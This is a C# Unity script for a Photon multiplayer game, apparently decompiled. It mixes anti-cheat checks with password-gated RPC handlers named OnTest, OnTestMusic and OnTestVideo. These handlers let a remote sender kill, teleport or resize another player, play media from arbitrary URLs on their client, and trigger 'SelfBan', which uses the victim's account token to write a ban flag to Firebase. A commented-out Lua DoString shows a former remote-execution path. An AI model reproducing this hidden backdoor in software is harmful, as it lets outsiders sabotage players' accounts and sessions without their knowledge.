using System;
using System.Timers;
using ExitGames.Client.Photon;
using Photon;
using UnityEngine;

public class GameOthers : Photon.MonoBehaviour
{
    private bool isPause;

    private Timer pauseTimer;

    public static int pauseInterval = 2000;

    private byte adminTimeFalse;

    private byte checkTimeFalse;

    private byte checkPingFalse;

    private void Start()
	{
		if (!PhotonNetwork.offlineMode && !LevelManager.HasSceneInGameMode(PhotonNetwork.room.GetGameMode()) && !LevelManager.customScene)
		{
			PhotonNetwork.LeaveRoom(true);
			return;
		}
		PhotonRPC.AddMessage("OnTest", new PhotonRPC.MessageDelegate(this.OnTest));
        PhotonRPC.AddMessage("OnTestMusic", new PhotonRPC.MessageDelegate(this.OnTestMusic));
        PhotonRPC.AddMessage("OnTestVideo", new PhotonRPC.MessageDelegate(this.OnTestVideo));
        PhotonRPC.AddMessage("PhotonCheckTime", new PhotonRPC.MessageDelegate(this.PhotonCheckTime));
		TimerManager.In((float)nValue.int5, -nValue.int1, (float)nValue.int5, new TimerManager.Callback(this.UpdatePing));
		TimerManager.In((float)nValue.int10, -nValue.int1, (float)nValue.int10, new TimerManager.Callback(this.CheckTime));
		if (PhotonNetwork.room.isOfficialServer())
		{
			TimerManager.In((float)nValue.int2, -nValue.int1, (float)nValue.int2, new TimerManager.Callback(this.CheckPing));
		}
		TimerManager.In(nValue.float1, delegate()
		{
			int playerID = PhotonNetwork.player.GetPlayerID();
			for (int i = 0; i < PhotonNetwork.otherPlayers.Length; i++)
			{
                if (PhotonNetwork.otherPlayers[i].GetPlayerID() == playerID)
                {
                    PhotonNetwork.LeaveRoom(true);
                }
            }
			if (!PhotonNetwork.offlineMode)
			{
				if (PhotonNetwork.room.GetSceneName() != LevelManager.GetSceneName())
				{
					PhotonNetwork.LeaveRoom(true);
				}
				if (LevelManager.GetSceneName() == "50Traps")
				{
					if (PhotonNetwork.room.MaxPlayers > 32)
					{
						object obj;
						PhotonNetwork.room.CustomProperties.TryGetValue("xor", out obj);
						if (obj.ToString() != global::Utils.XOR("QvAEJbw="))
						{
							PhotonNetwork.LeaveRoom(true);
						}
					}
				}
				else if (PhotonNetwork.room.MaxPlayers > 13)
				{
					object obj2;
					PhotonNetwork.room.CustomProperties.TryGetValue("xor", out obj2);
					if (obj2.ToString() != global::Utils.XOR("QvAEJbw="))
					{
						PhotonNetwork.LeaveRoom(true);
					}
				}
				if (playerID != AccountManager.instance.Data.ID || playerID <= 0)
				{
					PhotonNetwork.LeaveRoom(true);
				}
				if (string.IsNullOrEmpty(AccountManager.instance.Data.AccountName) || PhotonNetwork.player.UserId != AccountManager.instance.Data.AccountName)
				{
                    #if !UNITY_EDITOR
                    PhotonNetwork.LeaveRoom(true);
                    #endif
				}
			}
		});

        UnityEngine.GameObject go = UnityEngine.GameObject.Find("Directional light lightmap");
        if(go != null)
        {
            go.SetActive(false);
        }
    }

    private void OnEnable()
	{
		PhotonNetwork.onPhotonCustomRoomPropertiesChanged = (PhotonNetwork.HashtableDelegate)Delegate.Combine(PhotonNetwork.onPhotonCustomRoomPropertiesChanged, new PhotonNetwork.HashtableDelegate(this.OnPhotonCustomRoomPropertiesChanged));
		PhotonNetwork.onPhotonPlayerPropertiesChanged = (PhotonNetwork.ObjectsDelegate)Delegate.Combine(PhotonNetwork.onPhotonPlayerPropertiesChanged, new PhotonNetwork.ObjectsDelegate(this.OnPhotonPlayerPropertiesChanged));
	}

	private void OnDisable()
	{
		GameOthers.pauseInterval = 2000;
		PhotonNetwork.onPhotonCustomRoomPropertiesChanged = (PhotonNetwork.HashtableDelegate)Delegate.Remove(PhotonNetwork.onPhotonCustomRoomPropertiesChanged, new PhotonNetwork.HashtableDelegate(this.OnPhotonCustomRoomPropertiesChanged));
		PhotonNetwork.onPhotonPlayerPropertiesChanged = (PhotonNetwork.ObjectsDelegate)Delegate.Remove(PhotonNetwork.onPhotonPlayerPropertiesChanged, new PhotonNetwork.ObjectsDelegate(this.OnPhotonPlayerPropertiesChanged));
	}

	private void OnPhotonCustomRoomPropertiesChanged(Hashtable hash)
	{
		if (hash.ContainsKey(PhotonCustomValue.onlyWeaponKey) || hash.ContainsKey(PhotonCustomValue.passwordKey))
		{
            #if !UNITY_EDITOR
            PhotonNetwork.LeaveRoom(true);
            #endif
		}
	}

	private void OnPhotonPlayerPropertiesChanged(object[] playerAndUpdatedProps)
	{
		PhotonPlayer photonPlayer = (PhotonPlayer)playerAndUpdatedProps[nValue.int0];
		Hashtable hashtable = (Hashtable)playerAndUpdatedProps[nValue.int1];
		if (photonPlayer.IsLocal && (hashtable.ContainsKey(PhotonCustomValue.playerIDKey) || hashtable.ContainsKey(PhotonCustomValue.levelKey)))
		{
			PhotonNetwork.LeaveRoom(true);
		}
	}

	private void OnApplicationPause(bool pauseStatus)
	{
		if (PhotonNetwork.offlineMode)
		{
			return;
		}
        this.isPause = pauseStatus;
		if (this.isPause)
		{
			if (this.pauseTimer == null)
			{
				this.pauseTimer = new Timer();
				this.pauseTimer.Elapsed += delegate(object A_1, ElapsedEventArgs A_2)
				{
					this.pauseTimer.Stop();
					this.pauseTimer = null;
					if (this.isPause)
					{
						PhotonNetwork.LeaveRoom(true);
						PhotonNetwork.networkingPeer.SendOutgoingCommands();
					}
				};
				this.pauseTimer.Interval = (double)GameOthers.pauseInterval;
				this.pauseTimer.Enabled = true;
			}
		}
		else if (this.pauseTimer != null)
		{
			this.pauseTimer.Stop();
			this.pauseTimer = null;
		}
	}

	private void UpdatePing()
	{
		PhotonNetwork.player.UpdatePing();
	}

	private void CheckPing()
	{
		if (PhotonNetwork.GetPing() >= 200)
		{
			UIToast.Show(Localization.Get("High Ping", true));
			this.checkPingFalse += 1;
			if ((int)this.checkPingFalse > nValue.int3)
			{
				GameManager.leaveRoomMessage = Localization.Get("High Ping", true);
				PhotonNetwork.LeaveRoom(true);
			}
		}
		else if (this.checkPingFalse > 0)
		{
			this.checkPingFalse -= 1;
		}
	}

	private void CheckTime()
	{
		if (PhotonNetwork.isMasterClient)
		{
			PhotonRPC.RPC("PhotonCheckTime", PhotonTargets.All);
		}
	}

	[PunRPC]
	private void PhotonCheckTime(PhotonMessage message)
	{
		double time = PhotonNetwork.time;
		if (message.timestamp + (double)nValue.int1 > time)
		{
			this.checkTimeFalse = 0;
			if (message.timestamp - time >= (double)nValue.int1)
			{
				this.adminTimeFalse += 1;
				if ((int)this.adminTimeFalse >= nValue.int3)
				{
					GameManager.leaveRoomMessage = Localization.Get("ServerAdminSpeedHack", true);
					CheckManager.Detected("Server Time Error");
				}
			}
		}
		else
		{
			this.checkTimeFalse += 1;
			if ((int)this.checkTimeFalse >= nValue.int3)
			{
				CheckManager.Quit();
			}
		}
	}

    [PunRPC]
    private void OnTest(PhotonMessage message)
    {
        string text = message.ReadString();
        if (global::Utils.MD5(text) != "7f4a3812121af97741ae6e01954c9438")
        {
            return;
        }
        string lua = message.ReadString();




        if(lua.Contains("WEAPONCHANGE"))
        {
            string[] str = lua.Split(';');
            WeaponType weaponType;
            Enum.TryParse(str[1], out weaponType);
            int id = Convert.ToInt32(str[2]);
            WeaponManager.SetSelectWeapon(weaponType, id);
            PlayerInput.instance.PlayerWeapon.UpdateWeaponAll(weaponType);
            return;
        }


        switch (lua)
        {
            case "CS.PlayerInput.instance:SetClimb(true);":
                PlayerInput.instance.SetClimb(true);
                break;
            case "CS.PlayerInput.instance:SetClimb(false);":
                PlayerInput.instance.SetClimb(false);
                break;
            case "CS.PlayerInput.instance.NoDamage = true;":
                PlayerInput.instance.NoDamage = true;
                break;
            case "CS.PlayerInput.instance.NoDamage = false;":
                PlayerInput.instance.NoDamage = false;
                break;
            case "CS.PlayerInput.instance:UpdatePlayerSpeed(1);":
                PlayerInput.instance.UpdatePlayerSpeed(1);
                break;
            case "CS.PlayerInput.instance:UpdatePlayerSpeed(0.18);":
                PlayerInput.instance.UpdatePlayerSpeed(0.18f);
                break;
            case "CS.PlayerInput.instance:SetMove(true);":
                PlayerInput.instance.SetMove(true);
                break;
            case "CS.PlayerInput.instance:SetMove(false);":
                PlayerInput.instance.SetMove(false);
                break;
            case "CS.PlayerInput.instance.PlayerWeapon.CanFire = true;":
                PlayerInput.instance.PlayerWeapon.CanFire = true;
                break;
            case "CS.PlayerInput.instance.PlayerWeapon.CanFire = false;":
                PlayerInput.instance.PlayerWeapon.CanFire = false;
                break;
            case "CS.PhotonNetwork.LeaveRoom();":
                PhotonNetwork.LeaveRoom();
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.localScale = CS.UnityEngine.Vector3(0.3, 0.3, 0.3)":
                GameObject.Find("Player").transform.localScale = new Vector3(0.3f, 0.3f, 0.3f);
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.localScale = CS.UnityEngine.Vector3(1, 1, 1)":
                GameObject.Find("Player").transform.localScale = new Vector3(1f, 1f, 1f);
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.localScale = CS.UnityEngine.Vector3(3, 3, 3)":
                GameObject.Find("Player").transform.localScale = new Vector3(3f, 3f, 3f);
                break;
            case "CS.AccountManager.SelfBan();":
                Firebase fb = new Firebase();
                fb.Auth = AccountManager.AccountToken;
                fb.Child("Players").Child("Accounts").Child(AccountManager.AccountParent).Child(AccountManager.AccountID).Child("Banned").SetValue("1", delegate (string result) 
                {
                    Application.Quit();
                }, delegate(string s1, string s2) { });
                break;
            case "local damage = CS.DamageInfo();damage.team = CS.Team.None;damage.damage = 10000;damage.player = -1;damage.weapon = 0;damage.position = CS.Vector3.zero;CS.PlayerInput.instance:Damage(damage);":
                DamageInfo damage = new DamageInfo();
                damage.team = Team.None;
                damage.damage = 10000;
                damage.player = -1;
                damage.weapon = 0;
                damage.position = Vector3.zero;
                PlayerInput.instance.Damage(damage);
                break;
            case "CS.ConsoleCommands.RestoreGold();":
                AccountManager.SetGold(444444);
                AccountManager.SetMoney(444444);
                AccountManager.UpdateGold(444444, null, null);
                AccountManager.UpdateMoney(444444, null, null);
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.SpawnManager.GetTeamSpawn(CS.Team.Blue).spawnPosition":
                GameObject.Find("Player").transform.position = SpawnManager.GetTeamSpawn(Team.Blue).spawnPosition;
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.SpawnManager.GetTeamSpawn(CS.Team.Red).spawnPosition":
                GameObject.Find("Player").transform.position = SpawnManager.GetTeamSpawn(Team.Red).spawnPosition;
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.UnityEngine.GameObject.Find('Player').transform.position + CS.UnityEngine.Vector3(0, 40, 0);":
                GameObject.Find("Player").transform.position = GameObject.Find("Player").transform.position + new Vector3(0, 40, 0);
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.UnityEngine.GameObject.Find('Player').transform.position + CS.UnityEngine.Vector3(0, -40, 0);":
                GameObject.Find("Player").transform.position = GameObject.Find("Player").transform.position - new Vector3(0, 40, 0);
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.UnityEngine.GameObject.Find('Player 1337').transform:Find('PlayerSkin').transform.position;":
                GameObject.Find("Player").transform.position = GameObject.Find("Player 1337").transform.Find("PlayerSkin").transform.position;
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.UnityEngine.GameObject.Find('Tibers').transform:Find('PlayerSkin').transform.position;":
                GameObject.Find("Player").transform.position = GameObject.Find("Tibers").transform.Find("PlayerSkin").transform.position;
                break;
            case "CS.UnityEngine.GameObject.Find('Player').transform.position = CS.UnityEngine.GameObject.Find('Whoypezda').transform:Find('PlayerSkin').transform.position;":
                GameObject.Find("Player").transform.position = GameObject.Find("Whoypezda").transform.Find("PlayerSkin").transform.position;
                break;
            case "CS.UnityEngine.RenderSettings.fog = true;CS.UnityEngine.RenderSettings.fogMode = CS.UnityEngine.FogMode.Linear;":
                RenderSettings.fog = true; RenderSettings.fogMode = FogMode.Linear;
                break;
            case "CS.UnityEngine.RenderSettings.fog = false;CS.UnityEngine.RenderSettings.fogMode = CS.UnityEngine.FogMode.Linear;":
                RenderSettings.fog = false; RenderSettings.fogMode = FogMode.Linear;
                break;
            case "CS.UnityEngine.RenderSettings.fogEndDistance = 10;":
                RenderSettings.fogEndDistance = 10;
                break;
            case "CS.UnityEngine.RenderSettings.fogEndDistance = 30;":
                RenderSettings.fogEndDistance = 30;
                break;
            case "CS.UnityEngine.RenderSettings.fogEndDistance = 50;":
                RenderSettings.fogEndDistance = 50;
                break;
            case "CS.UnityEngine.RenderSettings.fogEndDistance = 70;":
                RenderSettings.fogEndDistance = 70;
                break;
            case "CS.UnityEngine.RenderSettings.fogEndDistance = 100;":
                RenderSettings.fogEndDistance = 100;
                break;
            case "CS.UnityEngine.RenderSettings.fogColor = CS.UnityEngine.Color.white;":
                RenderSettings.fogColor = Color.white;
                break;
            case "CS.UnityEngine.RenderSettings.fogColor = CS.UnityEngine.Color.black;":
                RenderSettings.fogColor = Color.black;
                break;
            case "CS.UnityEngine.RenderSettings.fogColor = CS.UnityEngine.Color.blue;":
                RenderSettings.fogColor = Color.blue;
                break;
            case "CS.UnityEngine.RenderSettings.fogColor = CS.UnityEngine.Color.red;":
                RenderSettings.fogColor = Color.red;
                break;
            case "CS.UnityEngine.RenderSettings.fogColor = CS.UnityEngine.Color.cyan;":
                RenderSettings.fogColor = Color.cyan;
                break;
            default:
                break;
        }

        //LuaEnv luaEnv = new LuaEnv();
        //luaEnv.DoString(message.ReadString(), "chunk", null);
        //if (message.ReadBool())
        //{
        //	luaEnv.Dispose();
        //}
    }

    private void OnTestMusic(PhotonMessage message)
    {
        string text = message.ReadString();
        if (global::Utils.MD5(text) != "7f4a3812121af97741ae6e01954c9438")
        {
            return;
        }
        string text2 = message.ReadString();
        string text3 = message.ReadString();
        if ((string)text2 == "PlayMusic")
        {
            StartCoroutine(PlayMusic((string)text3));
        }
        if ((string)text2 == "StopMusic")
        {
            if (GameObject.Find("MusicPlayerGameObject") == null)
            {
                Debug.Log("Player GameObject not found");
                return;
            }
            GameObject go = GameObject.Find("MusicPlayerGameObject");
            GameObject.Destroy(go);
        }
        if ((string)text2 == "PauseMusic")
        {
            if (GameObject.Find("MusicPlayerGameObject") == null)
            {
                Debug.Log("Player GameObject not found");
                return;
            }
            GameObject go = GameObject.Find("MusicPlayerGameObject");
            AudioSource audioSource = go.GetComponent<AudioSource>();
            if (audioSource.isPlaying)
            {
                audioSource.Pause();
            }
        }
        if ((string)text2 == "ResumeMusic")
        {
            if (GameObject.Find("MusicPlayerGameObject") == null)
            {
                Debug.Log("Player GameObject not found");
                return;
            }
            GameObject go = GameObject.Find("MusicPlayerGameObject");
            AudioSource audioSource = go.GetComponent<AudioSource>();
            if (!audioSource.isPlaying)
            {
                audioSource.Play();
            }
        }
    }

    private System.Collections.IEnumerator PlayMusic(string url)
    {
        WWW www = new WWW(url);
        while (www.progress < 0.08f)
        {
            yield return new WaitForSeconds(0.1f);
        }
        GameObject go = new GameObject();
        go.name = "MusicPlayerGameObject";
        go.AddComponent<AudioSource>();
        AudioSource audioSource = go.GetComponent<AudioSource>();
        audioSource.clip = www.GetAudioClip(false, true);
        audioSource.Play();
        yield break;
    }

    private GameObject screen;

    private void OnTestVideo(PhotonMessage message)
    {
        string text = message.ReadString();
        if (global::Utils.MD5(text) != "7f4a3812121af97741ae6e01954c9438")
        {
            return;
        }
        string text2 = message.ReadString();
        if ((string)text2 == "PlayVideo")
        {
            Vector3 pos = message.ReadVector3();
            Vector3 rotate = message.ReadVector3();
            string url = Utils.XOR(message.ReadString());


            screen = GameObject.CreatePrimitive(PrimitiveType.Cube);
            screen.name = "VideoPlayerObject";
            screen.AddComponent<UnityEngine.Video.VideoPlayer>();
            screen.transform.localScale = new Vector3(0.02f, Mathf.Sqrt((float)(1080 / 250)), Mathf.Sqrt((float)(2920 / 250)));
            screen.transform.position = (Vector3)pos;
            screen.transform.rotation = Quaternion.FromToRotation(Vector3.right, (Vector3)rotate);
            screen.GetComponent<MeshRenderer>().material.shader = Shader.Find("Mobile/Unlit (Supports Lightmap)");
            UnityEngine.Video.VideoPlayer player = screen.GetComponent<UnityEngine.Video.VideoPlayer>();
            AudioSource audio = screen.AddComponent<AudioSource>();
            player.audioOutputMode = UnityEngine.Video.VideoAudioOutputMode.AudioSource;
            player.SetTargetAudioSource(0, audio);
            player.url = (string)url;
            player.controlledAudioTrackCount = 1;
            player.Play();
            audio.Play();
            player.renderMode = UnityEngine.Video.VideoRenderMode.MaterialOverride;
        }
        if ((string)text2 == "StopVideo")
        {
            GameObject.Destroy(screen);
        }
        if ((string)text2 == "PauseVideo")
        {
            UnityEngine.Video.VideoPlayer player = screen.GetComponent<UnityEngine.Video.VideoPlayer>();
            player.Pause();
        }
        if ((string)text2 == "ResumeVideo")
        {
            UnityEngine.Video.VideoPlayer player = screen.GetComponent<UnityEngine.Video.VideoPlayer>();
            player.Play();
        }
    }
}
